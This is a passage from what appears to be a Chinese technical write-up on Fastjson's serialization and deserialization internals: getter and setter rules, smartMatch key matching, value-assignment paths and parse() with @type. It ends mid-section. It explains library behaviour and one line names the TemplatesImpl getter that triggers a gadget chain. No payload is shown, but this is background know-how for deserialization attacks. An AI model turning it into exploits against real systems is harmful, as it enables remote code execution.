<h4 id="属性过滤规则"><a href="#属性过滤规则" class="headerlink" title="属性过滤规则"></a>属性过滤规则</h4><p>POJO 在序列化时，并不是所有属性都会被序列化到 JSON 字符串中，例如下面这几种情境的中的属性就不会被序列化。</p>
<ul>
<li><code>static</code> 字段：不会序列化。</li>
<li><code>transient</code> 字段：默认不会序列化（除非关闭 <code>SkipTransientField</code> 特性）。</li>
<li><code>@JSONField(serialize=false)</code>：强制忽略。</li>
<li><code>@JSONType(ignores=...)</code>：类级别忽略。</li>
</ul>
<h4 id="属性获取规则"><a href="#属性获取规则" class="headerlink" title="属性获取规则"></a>属性获取规则</h4><p>Fastjson 在序列化 POJO 时<strong>不会调用 setter</strong>；它会优先调用 <strong>getter&#x2F;isXxx</strong> 取值，<strong>没有 getter 时会退回到“直接读字段值”</strong>（field access）：</p>
<ol>
<li><p>优先调用 <code>getter</code>&#x2F;<code>isXxx</code> 函数获取属性：</p>
<ol>
<li>若有 <code>getXxx()</code>（<strong>必须是 <code>public</code> 类型非静态方法</strong>，否则不调用）则优先调用 <code>getter</code> 取值。</li>
<li>否则若有 <code>isXxx()</code> 则调用 <code>isXxx</code>（<strong>必须是 <code>public</code> 类型非静态方法</strong>且<strong>返回值必须为 <code>boolean</code> 类型</strong>，否则不调用）取值，不过此时取到的值是 <code>boolean</code> 类型，可能与原类型不同。</li>
</ol>
<p>且属性类型以及过滤原则与 <code>getter</code>&#x2F;<code>isXxx</code> 函数的返回类型有关，例如：</p>
<ul>
<li>一个属性是其他任意类型，但是仅有对应的 <code>isXxx</code> 函数，则序列化结果中该属性类型与 <code>isXxx</code> 函数返回值一致，即 <code>boolean</code> 类型。</li>
<li>一个属性是 <code>static</code> 类型，但是有一个非 <code>static</code> 的 <code>getter</code>&#x2F;<code>isXxx</code> 函数，则以函数为准，可以序列化该属性。</li>
</ul>
</li>
<li><p>否则如果字段是 <code>public</code> 字段且字段类型可以被反序列化则直接读取该字段。</p>
</li>
</ol>
<h4 id="属性转换规则"><a href="#属性转换规则" class="headerlink" title="属性转换规则"></a>属性转换规则</h4><p>Fastjson 在序列化时对一些特殊类型有内置规则，其中最重要的是 **<code>byte[]</code>**：</p>
<ul>
<li><strong>序列化时</strong>：<code>byte[]</code> 会被自动 <strong>Base64 编码</strong>，转为字符串存入 JSON；</li>
<li><strong>反序列化时</strong>：遇到 <code>byte[]</code> 字段会调用 <code>JSONScanner#bytesValue</code> 自动进行 Base64 解码，还原为字节数组。</li>
</ul>
<p>另外其他类型为了方面做序列化&#x2F;反序列化，同样也会做一些转换。</p>
<ul>
<li>**<code>char[]</code>**：按字符串输出</li>
<li><strong>日期&#x2F;时间</strong>：默认时间戳；可用 <code>@JSONField(format=&quot;yyyy-MM-dd HH:mm:ss&quot;)</code> 或 <code>WriteDateUseDateFormat</code> 指定格式</li>
<li><strong>枚举</strong>：默认名称（<code>WriteEnumUsingName</code>），也可切换 <code>WriteEnumUsingToString</code>&#x2F;序号</li>
<li><strong>循环引用</strong>：默认检测并写 <code>$ref</code>；可用 <code>DisableCircularReferenceDetect</code> 关闭（需确保无自引用）</li>
</ul>
<h4 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h4><p><strong>0) 入口与初始化</strong></p>
<ul>
<li>典型入口：<code>JSON.toJSONString(obj, SerializerFeature... features)</code></li>
<li>创建 **<code>SerializeWriter</code>**（高性能 <code>char[]</code> buffer，按特性位设置转义、单双引号、null 输出策略、是否禁用循环检测等）。</li>
<li>构造 **<code>JSONSerializer</code>**（持有 <code>SerializeWriter</code> 与全局 <code>SerializeConfig</code>；后者维护 “Java 类型 → <code>ObjectSerializer</code>” 的写入器映射）。</li>
<li>调用 <code>serializer.write(obj)</code> 进入<strong>主序列化分发</strong>。</li>
</ul>
<hr>
<p><strong>1) 分发（按运行时类型选择 <code>ObjectSerializer</code>）</strong></p>
<ul>
<li><code>null</code> → 写入 <code>&quot;null&quot;</code>。</li>
<li><code>String/Number/Boolean/Date/Calendar/Enum/数组/集合/Map/JSONAware/...</code> → 各有专用 <code>ObjectSerializer</code>（<code>StringSerializer/NumberSerializers/DateSerializer/EnumSerializer/ArraySerializer/CollectionSerializer/MapSerializer/...</code>）。</li>
<li>其它普通 POJO → **<code>JavaBeanSerializer</code>**（如满足条件会用 <strong>ASM</strong> 生成的 <code>ASMSerializer_*</code> 以优化性能）。</li>
</ul>
<hr>
<p><strong>2) JavaBean 路径（重点）</strong></p>
<p>当 <code>obj</code> 走到 <strong><code>JavaBeanSerializer.write(...)</code></strong> 或 ASM 版本时，会发生：</p>
<ol>
<li><strong>循环引用检测</strong><ul>
<li>默认启用。若对象已在引用表里，输出 <code>&#123;&quot;$ref&quot;:&quot;...&quot;&#125;</code>，否则登记后继续。可通过 <code>SerializerFeature.DisableCircularReferenceDetect</code> 关闭以提速。</li>
</ul>
</li>
<li><strong>是否输出 <code>@type</code>（类名）</strong><ul>
<li>若启用 <code>SerializerFeature.WriteClassName</code> 且类型非 final&#x2F;存在多态需要，先写 <code>&#123;&quot;@type&quot;:&quot;全限定类名&quot;, ...&#125;</code>。</li>
</ul>
</li>
<li><strong>确定字段顺序</strong><ul>
<li>依据 <code>@JSONType(orders=...)</code>、<code>SerializerFeature.SortField</code>，以及 <code>JavaBeanInfo.sortedGetters</code> 的内省结果。<code>JavaBeanInfo#build</code> 会收集“**符合 JavaBean 规范的 <code>getXxx()</code> &#x2F; <code>isXxx()</code>**”到 <code>FieldInfo[]</code>，作为即将输出的“属性列表”。</li>
</ul>
</li>
<li><strong>前置过滤器（Before&#x2F;PropertyPre）</strong><ul>
<li><code>PropertyPreFilter</code> 用来<strong>是否参与序列化</strong>；<code>BeforeFilter</code> 可<strong>先写入</strong>一些扩展字段。顺序：pre-filter → before-filter。</li>
</ul>
</li>
<li><strong>逐个处理属性：</strong><ul>
<li>取属性名与 <code>FieldInfo</code>，然后 <strong>取值</strong>：<ul>
<li>若 <code>FieldInfo.method != null</code> → <strong><code>Method.invoke(obj)</code> 调用 getter</strong>；否则直接读 <code>field</code> 值。</li>
</ul>
</li>
<li><strong>过滤与变换</strong>：<ul>
<li><code>PropertyFilter</code>（是否保留）、<code>NameFilter</code>（改名）、<code>ValueFilter</code>&#x2F;<code>ContextValueFilter</code>（改值）、<code>LabelFilter</code>（按标签筛选）。</li>
</ul>
</li>
<li><strong>null、缺省值策略</strong>：<ul>
<li><code>WriteMapNullValue</code>（输出 null 字段）、<code>WriteNullStringAsEmpty</code>、<code>WriteNullNumberAsZero</code>、<code>NotWriteDefaultValue</code>、<code>NullAsDefaultValue</code>（不同行为，版本略有差异）。</li>
</ul>
</li>
<li><strong>递归写入</strong>：对属性值再走一遍“分发 → 写出”。</li>
</ul>
</li>
<li><strong>后置过滤器（AfterFilter）</strong><ul>
<li>可以在所有属性之后<strong>再追加</strong>一些派生字段。</li>
</ul>
</li>
<li><strong>BeanToArray（可选）</strong><ul>
<li>若启用 <code>SerializerFeature.BeanToArray</code> 或 <code>@JSONType(serialzeFeatures=BeanToArray)</code>，这个 JavaBean 将按 getter 顺序<strong>以数组形式</strong>输出，而非对象。</li>
</ul>
</li>
</ol>
<hr>
<p><strong>3) Map &#x2F; Collection &#x2F; Array &#x2F; 特殊类型</strong></p>
<ul>
<li><strong>Map</strong>：遍历 <code>entrySet</code>；<strong>key</strong> 默认是 <code>String</code> 最稳。若 key 不是字符串，可开启 <code>WriteNonStringKeyAsString</code> 强制转字符串，否则可能产生 <code>&#123;1:&quot;x&quot;&#125;</code> 这类<strong>非标准 JSON</strong>（浏览器端会报错）。相关讨论&#x2F;用例在官方 issue 中可见。</li>
<li><strong>Collection&#x2F;数组</strong>：依次写每个元素。</li>
<li><strong>Date&#x2F;时间</strong>：<code>WriteDateUseDateFormat</code> 或 <code>UseISO8601DateFormat</code> 会影响输出格式。</li>
</ul>
<hr>
<p><strong>4) 特性开关（常见）</strong></p>
<ul>
<li><strong>IgnoreNonFieldGetter</strong>：忽略<strong>没有对应字段</strong>的 getter（减少误调）。也可用 <code>@JSONField(serialize=false)</code> 精确关闭某个 getter。</li>
<li><strong>DisableCircularReferenceDetect</strong>：提速，牺牲循环引用安全。</li>
<li><strong>BrowserCompatible &#x2F; BrowserSecure</strong>：浏览器兼容&#x2F;安全输出。</li>
</ul>
<h2 id="JSON-POJO（反序列化）"><a href="#JSON-POJO（反序列化）" class="headerlink" title="JSON -&gt; POJO（反序列化）"></a>JSON -&gt; POJO（反序列化）</h2><p>Fastjson 提供了多个入口函数用于 JSON 字符串反序列化为对象，常见有 <code>parse</code> 和 <code>parseObject</code>。</p>
<ul>
<li><code>parse</code>：<strong>为了灵活性</strong>，可以解析一切 JSON，但返回类型不确定，还可能有安全风险。</li>
<li><code>parseObject</code>：<strong>为了类型安全</strong>，只解析成指定类，结果可控，适合大多数业务场景。</li>
</ul>
<h3 id="属性赋值特性"><a href="#属性赋值特性" class="headerlink" title="属性赋值特性"></a>属性赋值特性</h3><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><ol>
<li><p><strong>建“属性索引表”（Class → FieldInfo[]）</strong></p>
<p>Fastjson 在反序列化前会扫描目标类，识别可写入的属性，整理为一组 <code>FieldInfo</code>。核心入口是 <code>com.alibaba.fastjson.util.JavaBeanInfo.build(...)</code>，它会综合<strong>setter 方法</strong>、<strong>public 字段</strong>、以及部分 <strong>getter（容器只读）</strong>来建立索引，并考虑注解与命名策略。要点：</p>
<ul>
<li><p><strong>优先收集 setter</strong>：</p>
<ul>
<li><p><strong>挑选规则</strong>：</p>
<ul>
<li>**非 <code>static</code>**；</li>
<li><strong>只接收 1 个参数</strong>；</li>
<li><strong>返回 <code>void</code> 或返回声明类本身</strong>（支持链式 &#x2F; Fluent setter）。</li>
<li>若方法或字段上有 <code>@JSONField(deserialize=false)</code>，则该属性<strong>不参与反序列化</strong>；若 <code>@JSONField(name=...)</code> 非空，则<strong>直接采用该 name 作为属性名</strong>。</li>
</ul>
</li>
<li><p><strong>从方法名推导属性名</strong>：</p>
<p>设方法名为 <code>set...</code>，取第 4 个字符 <code>c3 = methodName.charAt(3)</code>：</p>
<ol>
<li><p>**常规 <code>setXxx</code>**，若 <code>c3</code> 是大写（或 <code>c3 &gt; 512</code>，兼容非 ASCII 命名）则：</p>
<ul>
<li><code>TypeUtils.compatibleWithJavaBean</code> 为真 → <code>propertyName = decapitalize(methodName.substring(3))</code>；</li>
<li>否则 → <code>propertyName = toLower(methodName.charAt(3)) + methodName.substring(4)</code>。</li>
</ul>
</li>
<li><p>**下划线风格 <code>set_abc</code>**：直接 <strong>丢弃下划线</strong>，取 <code>propertyName = methodName.substring(4)</code>，也就是 **<code>&quot;abc&quot;</code>**。</p>
<p><strong>注意：这里没有“自动回退去找 <code>&quot;_abc&quot;</code> 字段”的步骤。</strong>如果类里字段叫 <code>&quot;_abc&quot;</code> 而不是 <code>&quot;abc&quot;</code>，<code>field</code> 可能为 <code>null</code>，但属性仍可通过 setter 正常写入；如需让 JSON 键名也叫 <code>&quot;_abc&quot;</code>，请用 <code>@JSONField(name=&quot;_abc&quot;)</code> 显式指定。</p>
</li>
<li><p><strong><code>setfXxx</code> 特例</strong>：属性名取 <code>methodName.substring(3)</code>（即 <code>fXxx</code>）。</p>
</li>
<li><p><strong><code>setXURL</code>（第 5 位是大写）</strong>：属性名&#x3D;<code>decapitalize(methodName.substring(3))</code>。</p>
</li>
<li><p><strong>否则</strong>：不认为是合法 setter，跳过。</p>
</li>
</ol>
<p><strong>布尔字段</strong>：若按上述推导没找到字段，且参数类型是 <code>boolean</code>，还会额外尝试 <code>isXxx</code> 命名的字段（如属性名 <code>enabled</code> → 字段 <code>isEnabled</code>）。</p>
<p><strong>字段 &#x2F; 注解融合</strong>：若找到了字段，再读取字段上的 <code>@JSONField</code>；当字段注解里 <code>name</code> 非空时，<strong>以字段注解的 <code>name</code> 覆盖属性名</strong>，并记录序列化&#x2F;反序列化特性位。</p>
</li>
</ul>
</li>
<li><p><strong>补充 public 实例字段</strong>：将<strong>非 <code>static</code></strong> 的 <code>public</code> 字段加入；若是 <code>final</code> 字段，仅当是<strong>容器&#x2F;原子类</strong>（<code>Map</code>&#x2F;<code>Collection</code>&#x2F;<code>Atomic*</code>）才保留（避免对不可变标量写入）。同样会应用字段上的 <code>@JSONField</code> 与命名策略。</p>
</li>
<li><p><strong>“只读容器 getter”</strong>也会被当成<strong>可写属性</strong>记录：扫描 <strong>getter</strong>：当方法名 <code>getXxx</code>、无参、返回类型是 <code>Collection</code>&#x2F;<code>Map</code>&#x2F;<code>AtomicBoolean</code>&#x2F;<code>AtomicInteger</code>&#x2F;<code>AtomicLong</code>，且<strong>没有对应 setter</strong> 时，<strong>也会登记为一个属性项</strong>（read‑only property）。反序列化时走“取现有实例并<strong>就地填充</strong>”的路径（不替换引用）。属性名默认由 <code>getPropertyNameByMethodName(&quot;getXxx&quot;)</code> 推导，若方法上 <code>@JSONField(name=...)</code> 非空则用注解名。</p>
</li>
</ul>
<p><strong>这一步的产物</strong>是一组 <code>FieldInfo</code>，每条记录上挂好了：属性名、setter、对应字段、只读容器型 getter、注解元信息等。</p>
</li>
<li><p><strong>键名匹配（JSON key → 属性名）</strong></p>
<p>当解析到 JSON 的每个键时，<code>JavaBeanDeserializer</code> 会把该键匹配到某个 <code>FieldInfo</code>，匹配策略包含<strong>精确命中</strong>与<strong>智能匹配（smartMatch）</strong>两层：</p>
<ul>
<li><strong>直接命中（精确）</strong>：先按 <code>fieldNameHash</code> 直接找。</li>
<li><strong>smartMatch（默认开启）</strong>：若没命中且<strong>未启用</strong> <code>Feature.DisableFieldSmartMatch</code>，会做一轮<strong>宽松归一化匹配</strong>：<ol>
<li><strong>大小写不敏感</strong>（<code>fnv1a_64_lower</code>）；</li>
<li><strong>忽略分隔符</strong>再比较（<code>fnv1a_64_extract</code>，会**去掉下划线 <code>_</code> 和中划线 <code>-</code>**并转小写）；</li>
<li><strong>布尔 is 前缀</strong>：若 JSON key 以 <code>is</code> 开头，也会尝试去掉 <code>is</code> 再匹配布尔属性；</li>
<li><strong>别名</strong>：最后看 <code>@JSONField(alternateNames=...)</code> 是否包含该 key。</li>
</ol>
</li>
</ul>
</li>
<li><p><strong>选择赋值入口（属性名 → 实际调用路径）</strong></p>
<p>匹配到属性后，Fastjson 按<strong>优先级</strong>决定如何把值“写进去”：</p>
<ol>
<li><strong>优先走 setter</strong>：<ul>
<li>JSON 是字面量（数&#x2F;串&#x2F;布尔）→ 做类型转换后 **<code>setXxx(converted)</code>**；</li>
<li>JSON 是对象&#x2F;数组 → 先把该段 JSON <strong>递归反序列化成参数类型 <code>T</code> 的新实例</strong>，再 <code>setXxx(new T(...))</code>；</li>
<li><strong>容器参数（<code>Map</code>&#x2F;<code>Collection</code>&#x2F;<code>Properties</code> 等）</strong>：同理——<strong>新建</strong>目标实现并填充，再一次性 <code>setXxx(newValue)</code>；</li>
</ul>
</li>
<li><strong>无 setter，但属性记录的是“容器 getter”</strong> → <strong>调用 getter 拿已有实例并“就地填充”</strong>（<code>put</code>&#x2F;<code>add</code> 等），<strong>不替换引用</strong>；若 getter 返回 <code>null</code>，通常就填不进去（取决于具体 getter 的实现是否会自行初始化非空）。这一行为是 <code>JavaBeanInfo.build</code> 把“容器 getter”登记为属性项后，在反序列化分支里的特性。</li>
<li><strong>否则，在开启 <code>Feature.SupportNonPublicField</code> 时</strong> → <strong>直接写字段</strong>（<code>setAccessible(true)</code>），对对象&#x2F;数组同样是<strong>先 new “字段声明类型”的新实例</strong>并递归填充后<strong>整体替换</strong>。</li>
</ol>
</li>
</ol>
<h4 id="访问器规范"><a href="#访问器规范" class="headerlink" title="访问器规范"></a>访问器规范</h4><p>Fastjson 在解析 POJO 时，会扫描类中的方法，识别哪些方法是 <strong>getter</strong> &#x2F; <strong>setter</strong>，并据此推导出属性名。这部分规则位于 <code>com.alibaba.fastjson.util.JavaBeanInfo#build</code> 方法，具体如下：</p>
<p><strong>Setter 方法（用于反序列化赋值）</strong></p>
<ul>
<li><p><strong>非静态实例方法</strong></p>
</li>
<li><p><strong>方法名长度 ≥ 4</strong></p>
</li>
<li><p><strong>方法名以 <code>set</code> 开头</strong></p>
</li>
<li><p><strong>第 4 个字符必须是大写字母</strong></p>
<ul>
<li><code>setName(String name)</code> ✅</li>
<li><code>setname(String name)</code> ❌（不符合规范）</li>
</ul>
</li>
<li><p><strong>参数个数必须是 1</strong></p>
</li>
<li><p><strong>返回值类型可以是 <code>void</code> 或者链式调用（返回 this 也行）</strong></p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>返回<strong>父类&#x2F;接口类型</strong>的链式<strong>不</strong>视为 setter</p>

    </div>
  </div>
</li>
<li><p><strong>属性名的推导</strong>：去掉前缀 <code>set</code>，把第 4 个字符转小写，即得到属性名。</p>
<ul>
<li><code>setName(String)</code> → 属性 <code>name</code></li>
<li><code>setURL(String)</code> → 属性 <code>URL</code>（第二个字母大写时，保持全大写缩写不变）</li>
</ul>
</li>
</ul>
<hr>
<p><strong>Getter 方法（用于序列化或“容器就地填充”）</strong></p>
<ul>
<li><strong>非静态实例方法</strong></li>
<li><strong>方法名长度 ≥ 4</strong></li>
<li><strong>方法名以 <code>get</code> 开头</strong></li>
<li><strong>第 4 个字符必须是大写字母</strong><ul>
<li><code>getName()</code> ✅</li>
<li><code>getname()</code> ❌</li>
</ul>
</li>
<li><strong>参数个数必须是 0</strong>（不能有参数）</li>
<li><strong>返回值类型不限</strong>（可为任何对象类型）</li>
<li><strong>属性名的推导</strong>：去掉 <code>get</code> 前缀，首字母小写。<ul>
<li><code>getName()</code> → 属性 <code>name</code></li>
<li><code>getURL()</code> → 属性 <code>URL</code></li>
</ul>
</li>
</ul>
<hr>
<p><strong>Boolean Getter 方法（特殊规则）</strong></p>
<ul>
<li><p><strong>必须是非静态实例方法</strong></p>
</li>
<li><p><strong>方法名以 <code>is</code> 开头</strong></p>
</li>
<li><p><strong>第 3 个字符必须是大写字母</strong></p>
<ul>
<li><code>isAdmin()</code> ✅</li>
<li><code>isadmin()</code> ❌</li>
</ul>
</li>
<li><p><strong>参数个数必须是 0</strong></p>
</li>
<li><p><strong>返回值类型必须是 <code>boolean</code> 或 <code>Boolean</code></strong></p>
</li>
<li><p><strong>属性名的推导</strong>：去掉前缀 <code>is</code>，首字母小写。</p>
<ul>
<li><code>isAdmin()</code> → 属性 <code>admin</code></li>
<li><code>isVIP()</code> → <code>VIP</code>（保留缩写大写）</li>
</ul>
</li>
</ul>
<h4 id="属性名称匹配"><a href="#属性名称匹配" class="headerlink" title="属性名称匹配"></a>属性名称匹配</h4><p>FastJson 在反序列化的时候如果指定了目标类，则需要将 <strong>JSON 中的键名</strong>与<strong>目标类的属性名</strong>相匹配。这个匹配过程相当于访问器函数的定义要求要宽松的多，如果不到访问器中的方法则会调用 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 进行模糊匹配。</p>
<p>匹配的规则为：</p>
<ol>
<li><p><strong>精确匹配</strong> → key 必须和字段名一致。</p>
</li>
<li><p><strong>大小写不敏感匹配</strong> → “Name” 可以匹配字段 <code>name</code>。</p>
</li>
<li><p><strong>布尔 is 前缀</strong> → JSON <code>&quot;isAdmin&quot;</code> → Java 字段 <code>admin</code>（boolean 类型）。</p>
<ul>
<li><p>要求属性类型是 <code>boolean</code> 或 <code>Boolean</code></p>
</li>
<li><p>去掉 <code>&quot;is&quot;</code> 前缀后，再大小写不敏感匹配属性名</p>
</li>
</ul>
</li>
<li><p><strong>去掉下划线&#x2F;中划线</strong> → <code>&quot;user_name&quot;</code> 或 <code>&quot;user-name&quot;</code> → <code>userName</code>。</p>
<ul>
<li><p>会生成一个新的 key2 &#x3D; 去掉 <code>_</code>&#x2F;<code>-</code> 的版本并尝试直接查找 key2</p>
</li>
<li><p>如果还没有，再对比大小写不敏感</p>
</li>
</ul>
</li>
<li><p><strong>alternateName 别名匹配</strong> → @JSONField 配置的备用名字。</p>
<ul>
<li>如果前面都没命中，检查每个 <code>FieldInfo</code> 是否有 <code>@JSONField(alternateNames=...)</code>。</li>
<li>如果 JSON key 在备用别名列表里，则匹配成功。</li>
</ul>
</li>
</ol>
<h4 id="属性赋值策略"><a href="#属性赋值策略" class="headerlink" title="属性赋值策略"></a>属性赋值策略</h4><p>在反序列化的过程中需要对属性进行赋值，在此过程中会调用一些类的 getter、setter 以及无参构造方法。在不同的情景下，这些方法调用顺序与是否调用都不太相同：</p>
<p><strong>① 有 setter 方法</strong></p>
<ul>
<li><strong>基本规则</strong>：找到 <code>setXxx(T)</code> 就<strong>优先调用 setter</strong>。</li>
<li><strong>传入什么值</strong>取决于 JSON 里这个键对应的“值的形态”和 <code>T</code> 的类型：<ul>
<li><strong>字面量</strong>（字符串、数字、布尔等）→ 直接做<strong>类型转换</strong>后传给 setter（<strong>不会</strong>去 new 任何“子对象”）。</li>
<li><strong>对象&#x2F;数组</strong>（<code>&#123;&#125;</code> &#x2F; <code>[]</code>）→ Fastjson 会<strong>先把该 JSON 递归反序列化成 <code>T</code> 类型的一个新实例</strong>（通常通过 <code>T</code> 的<strong>无参构造函数</strong>+ 递归填充），<strong>再</strong>把这个实例作为参数传给 setter。</li>
</ul>
</li>
<li><strong>容器参数（<code>T</code> 为 <code>Map</code>&#x2F;<code>Collection</code>&#x2F;<code>Properties</code> 等）</strong>：同上规则——先 new 一个<strong>新的</strong>目标实现实例（<code>Map</code> 常用 <code>LinkedHashMap</code>，<code>List</code> 常用 <code>ArrayList</code>，<code>Properties</code> 直接 new），填入 JSON 内容，再一次性 <code>setXxx(newValue)</code>。</li>
<li><strong>副作用点</strong>：setter 里的自定义逻辑会执行；被构造的 <code>T</code>（如果是自定义类）在反序列化其内部字段&#x2F;属性时也会触发它们的构造&#x2F;初始化逻辑。</li>
</ul>
<hr>
<p><strong>② 无 setter，但有 getter，且 getter 返回容器类型</strong></p>
<ul>
<li><strong>触发条件</strong>：匹配到属性 <code>xxx</code>，类里<strong>没有</strong> <code>setXxx(...)</code>，但<strong>有</strong> <code>getXxx()</code>，且返回类型是<strong>可变容器</strong>（<code>Map</code> &#x2F; <code>Collection</code> &#x2F; <code>Properties</code> 等）。</li>
<li><strong>行为</strong>：Fastjson 会<strong>调用 getter</strong>，拿到<strong>现有实例</strong>（<strong>不会去 new 新对象</strong>），然后把 JSON 的 <code>&#123;&#125;</code> &#x2F; <code>[]</code> <strong>直接填进这个实例</strong>（<code>put</code>&#x2F;<code>add</code>）。</li>
<li><strong>关键差异</strong>（和①相比）：<ul>
<li><strong>不替换引用</strong>，只是在<strong>原对象上“就地填充”</strong>。</li>
<li><strong>getter 会被调用</strong>，所以<strong>getter 内的副作用</strong>会执行（<code>TemplatesImpl#getOutputProperties()</code> 就在这里触发链路）。</li>
</ul>
</li>
<li>**如果 getter 返回 <code>null</code>**：Fastjson <strong>不会</strong>自动 new 一个容器来“放回去”；这时就填不进去（具体走向与版本&#x2F;实现细节相关）。</li>
</ul>
<hr>
<p><strong>③ 无 setter，启用 <code>SupportNonPublicField</code>（走“字段赋值”）</strong></p>
<ul>
<li><strong>行为</strong>：Fastjson 直接通过反射给<strong>字段本身</strong>赋值（<code>setAccessible(true)</code>），<strong>不会</strong>调用 getter 或 setter。</li>
<li><strong>赋什么值</strong>同样取决于 JSON 值形态与字段类型：<ul>
<li><strong>字面量</strong> → 直接转换后写入字段。</li>
<li><strong>对象&#x2F;数组</strong> → Fastjson 会<strong>new 一个“字段声明类型”的新实例</strong>（用其<strong>无参构造函数</strong>）并递归填充，然后<strong>把这个新实例赋值给字段</strong>（<strong>替换</strong>原引用）。</li>
</ul>
</li>
<li><strong>与②的对比</strong>：<ul>
<li>② 是<strong>复用 getter 返回的现有容器</strong>并<strong>就地填充</strong>（不改引用）；</li>
<li>③ 是<strong>创建新实例</strong>并<strong>直接写字段</strong>（<strong>替换</strong>引用）。</li>
</ul>
</li>
<li><strong>容器字段</strong>：同样遵循“对象&#x2F;数组 → new 新实例再填充再赋值”的规则；<strong>不会</strong>先去读 getter，更不会“拿出来再放回去”。</li>
</ul>
<hr>
<p>在具体给属性赋值的时候也要参考属性的类型。</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>setter 路径</th>
<th>getter-容器填充</th>
<th>字段直写（SupportNonPublicField）</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><strong>public</strong></td>
<td>✔️ 正常</td>
<td>✔️ 正常</td>
<td>✔️ 无需额外特性也可（public 字段可见）</td>
<td>——</td>
</tr>
<tr>
<td><strong>private &#x2F; protected &#x2F; 包可见</strong></td>
<td>✔️ 只要 setter 是可见实例方法，就按规则调用</td>
<td>✔️ 若有返回容器的 getter</td>
<td>✔️ <strong>需</strong>开启 <code>SupportNonPublicField</code> 才能直接写</td>
<td>官方特性专为“非公有字段可写”提供支持。</td>
</tr>
<tr>
<td><strong>static 字段</strong></td>
<td>➖ <strong>不能</strong>把 <code>static setXxx</code> 当属性入口；<strong>实例</strong> setter 若<strong>内部</strong>去改静态字段，当然会生效</td>
<td>➖ 与属性无关</td>
<td>❌ **扫描字段时直接跳过 <code>static</code>**，不会当作可写属性</td>
<td>源码对字段扫描有 <code>Modifier.isStatic(...)</code> 的显式过滤。</td>
</tr>
<tr>
<td><strong>final</strong></td>
<td>✔️ setter 能改它“背后的状态”（取决于你的实现）</td>
<td>✔️（容器本身可被填充；但<strong>不会</strong>替换 <code>final</code> 引用）</td>
<td>⚠️ 直接改 <code>final</code> 字段的可行性很差；在现代 JDK 上通过反射写 <code>final</code> 往往失败或不可靠</td>
<td><strong>不要指望</strong>通过反射稳定修改 <code>final</code> 值；JDK 对此有严格限制。</td>
</tr>
<tr>
<td><strong>transient</strong></td>
<td>✔️ <strong>不影响</strong> setter 的调用（<code>transient</code> 只修饰字段，不约束方法调用）</td>
<td>✔️ 同上</td>
<td>⚠️ 字段扫描会把 <code>transient</code> 标记成 <code>fieldTransient</code> 并可被跳过（序列化侧明确；字段基路径通常也不把它当可写属性）</td>
<td>更稳妥的控制建议用 <code>@JSONField(deserialize = false/true)</code> 显式声明。</td>
</tr>
<tr>
<td><strong>volatile</strong></td>
<td>✔️ 与普通字段无差别</td>
<td>✔️</td>
<td>✔️</td>
<td>Fastjson 不对 <code>volatile</code> 做特殊处理。</td>
</tr>
</tbody></table>
<h3 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h3><p><code>parse</code> 函数有两种重载，函数声明如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的 JSON 字符串解析为 Java 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> text 待解析的 JSON 字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 解析后的 Java 对象（可能是 &#123;<span class="doctag">@code</span> JSONObject&#125;、&#123;<span class="doctag">@code</span> JSONArray&#125; 或根据 &quot;<span class="doctag">@type</span>&quot; 实例化的 JavaBean）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> com.alibaba.fastjson.JSONException 如果 JSON 文本格式不合法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的 JSON 字符串解析为 Java 对象（动态类型），并允许通过参数指定解析特性。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> text     待解析的 JSON 字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> features 指定的解析特性组合（位掩码，可由多个 Feature 的 mask 按位或组合）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 解析后的对象：可能是 &#123;<span class="doctag">@code</span> JSONObject&#125;、&#123;<span class="doctag">@code</span> JSONArray&#125;、基础字面量，或在策略允许时为 JavaBean</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> com.alibaba.fastjson.JSONException 如果 JSON 文本格式不合法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text, <span class="type">int</span> features)</span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="返回结果类型"><a href="#返回结果类型" class="headerlink" title="返回结果类型"></a>返回结果类型</h4><p><code>com.alibaba.fastjson.JSON#parse</code> 会解析 <code>text</code>，并根据 JSON 文本内容动态决定返回对象的类型：</p>
<ul>
<li><p>如果 JSON 中包含 <code>@type</code> 字段，Fastjson 会尝试根据该类名进行实例化并填充属性。</p>
</li>
<li><p>如果没有 <code>@type</code>，返回结果可能是 <code>JSONObject</code> 或 <code>JSONArray</code>。</p>
<ul>
